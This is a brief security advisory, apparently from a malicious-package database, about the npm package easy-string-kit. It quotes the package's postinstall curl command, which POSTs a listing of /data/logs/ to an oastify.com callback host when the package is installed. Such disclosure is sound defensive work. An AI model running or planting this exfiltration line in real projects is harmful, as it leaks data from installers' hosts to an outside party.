summary: easy-string-kit exfiltrates filesystem listing to attacker OAST endpoint on install
details: package.json declares a postinstall script that runs `curl -X POST -d "$(ls -la /data/logs/)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/data` automatically when the package is installed. The script enumerates the contents of /data/logs/ on the installer's host and POSTs the directory listing over plain HTTP to a unique subdomain on oastify.com — Burp Suite Collaborator's out-of-band-interaction service, routinely used as an attacker-controlled callback/exfiltration endpoint. The package presents itself as a string-utility library, which has no legitimate need to read host filesystem paths or beacon to a remote host at install time. Author, repository, homepage and bugs metadata are all empty and the keywords list contains a stray shell fragment (`trunls -lae`), consistent with a disposable lure rather than a real library.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
